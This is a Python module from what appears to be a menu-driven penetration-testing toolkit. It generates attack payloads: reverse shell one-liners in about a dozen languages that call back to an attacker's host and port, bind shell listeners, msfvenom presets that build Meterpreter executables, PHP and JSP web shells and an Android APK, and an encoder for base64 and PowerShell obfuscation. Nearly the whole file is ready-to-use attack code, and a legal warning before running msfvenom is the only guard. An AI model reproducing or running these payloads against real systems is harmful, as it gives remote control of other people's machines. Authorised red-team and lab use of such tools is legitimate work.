"""Payload generator: msfvenom wrapper + reverse/bind shell snippets."""
from __future__ import annotations

import base64

from rich.console import Console
from rich.syntax import Syntax
from rich.table import Table

from core.i18n import t
from core.menu import Menu, MenuItem
from core.utils import (
    ask_confirm,
    ask_input,
    check_command_exists,
    pause,
    print_error,
    print_info,
    print_success,
    print_warning,
    run_command,
)

console = Console()

REVERSE_SHELLS = {
    "bash":       'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    "bash TCP":   '0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196',
    "powershell": '$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$out=(Invoke-Expression $d 2>&1 | Out-String );$out2=$out+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($out2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()',
    "python":     'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])',
    "python (win)": 'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["cmd.exe"])',
    "perl":       'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    "php":        'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "ruby":       'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    "nc (mkfifo)": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
    "ncat (-e)":   'ncat {lhost} {lport} -e /bin/bash',
    "socat":      'socat tcp-connect:{lhost}:{lport} exec:bash,pty,stderr,setsid,sigint,sane',
    "java":       'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]); p.waitFor();',
}

BIND_SHELLS = {
    "nc (Linux)":   'nc -lvp {lport} -e /bin/bash',
    "nc (Windows)": 'nc -lvp {lport} -e cmd.exe',
    "ncat":         'ncat -lvp {lport} -e /bin/bash',
    "python":       'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{lport}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'',
    "perl":         'perl -e \'use Socket;$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,5);while(1){{accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");}}\'',
    "ruby":         'ruby -rsocket -e\'s=TCPServer.new({lport});while c=s.accept;IO.popen("/bin/sh -i",?r){{|p|while (d=p.readpartial(1024))rescue nil;c.write d;end}};end\'',
}

MSFVENOM_TEMPLATES = {
    "windows/meterpreter/reverse_tcp": "-p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe",
    "windows/x64/meterpreter/reverse_tcp": "-p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload_x64.exe",
    "windows/shell_reverse_tcp": "-p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
    "linux/x86/meterpreter/reverse_tcp": "-p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o payload.elf",
    "php/meterpreter/reverse_tcp": "-p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.php",
    "python/meterpreter/reverse_tcp": "-p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o payload.py",
    "java/jsp_shell_reverse_tcp": "-p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.jsp",
    "android/meterpreter/reverse_tcp": "-p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o payload.apk",
}


def _ask_lhost_lport() -> tuple[str, str]:
    lhost = ask_input(t("modules.payload.lhost"), default="127.0.0.1")
    lport = ask_input(t("modules.payload.lport"), default="4444")
    return lhost, lport


def reverse_shell_menu() -> None:
    lhost, lport = _ask_lhost_lport()
    table = Table(title=t("modules.payload.reverse_shell"), border_style="green")
    table.add_column("#", justify="right", style="cyan")
    table.add_column("Language", style="bold")
    table.add_column("Payload", style="white", overflow="fold")
    for idx, (name, template) in enumerate(REVERSE_SHELLS.items(), start=1):
        table.add_row(str(idx), name, template.format(lhost=lhost, lport=lport))
    console.print(table)
    print_info(f"Start a listener:  nc -lvnp {lport}")
    pause()


def bind_shell_menu() -> None:
    lport = ask_input(t("modules.payload.lport"), default="4444")
    table = Table(title=t("modules.payload.bind_shell"), border_style="green")
    table.add_column("#", justify="right", style="cyan")
    table.add_column("Language", style="bold")
    table.add_column("Payload", style="white", overflow="fold")
    for idx, (name, template) in enumerate(BIND_SHELLS.items(), start=1):
        table.add_row(str(idx), name, template.format(lport=lport))
    console.print(table)
    print_info(f"Connect from attacker:  nc <target> {lport}")
    pause()


def msfvenom_wrapper() -> None:
    if not check_command_exists("msfvenom"):
        print_error(t("ui.missing_tool", tool="msfvenom"))
        print_warning(t("ui.missing_tool_hint"))
        print_info("https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html")
        pause()
        return
    table = Table(title="Presets", border_style="cyan")
    table.add_column("#", justify="right", style="cyan")
    table.add_column("Payload", style="white")
    names = list(MSFVENOM_TEMPLATES.keys())
    for idx, name in enumerate(names, start=1):
        table.add_row(str(idx), name)
    console.print(table)
    choice_s = ask_input(t("modules.payload.payload_choice"), default="1")
    try:
        choice = int(choice_s)
        if not 1 <= choice <= len(names):
            raise ValueError
    except ValueError:
        print_error(t("ui.invalid_choice"))
        pause()
        return
    lhost, lport = _ask_lhost_lport()
    options = MSFVENOM_TEMPLATES[names[choice - 1]].format(lhost=lhost, lport=lport)
    print_warning(t("ui.warning_legal"))
    if not ask_confirm(t("ui.continue_confirm"), default=False):
        return
    run_command(f"msfvenom {options}", shell=True)
    pause()


def encoder() -> None:
    payload = ask_input("Payload string")
    if not payload:
        return
    data = payload.encode()
    table = Table(border_style="green")
    table.add_column("Encoding", style="cyan")
    table.add_column("Result", style="white", overflow="fold")
    table.add_row("Base64", base64.b64encode(data).decode())
    table.add_row("Base64 (url-safe)", base64.urlsafe_b64encode(data).decode())
    table.add_row("Hex", data.hex())
    table.add_row("Hex (spaced)", " ".join(f"{b:02x}" for b in data))
    table.add_row("PowerShell UTF16LE B64",
                  base64.b64encode(payload.encode("utf-16le")).decode())
    console.print(table)
    pause()


def build_menu(parent: Menu | None = None) -> Menu:
    menu = Menu(title_key="modules.payload.title", parent=parent)
    menu.add(MenuItem("modules.payload.reverse_shell", reverse_shell_menu,
                      "modules.payload.reverse_shell_desc"))
    menu.add(MenuItem("modules.payload.bind_shell", bind_shell_menu,
                      "modules.payload.bind_shell_desc"))
    menu.add(MenuItem("modules.payload.msfvenom", msfvenom_wrapper,
                      "modules.payload.msfvenom_desc"))
    menu.add(MenuItem("modules.payload.encoder", encoder,
                      "modules.payload.encoder_desc"))
    return menu
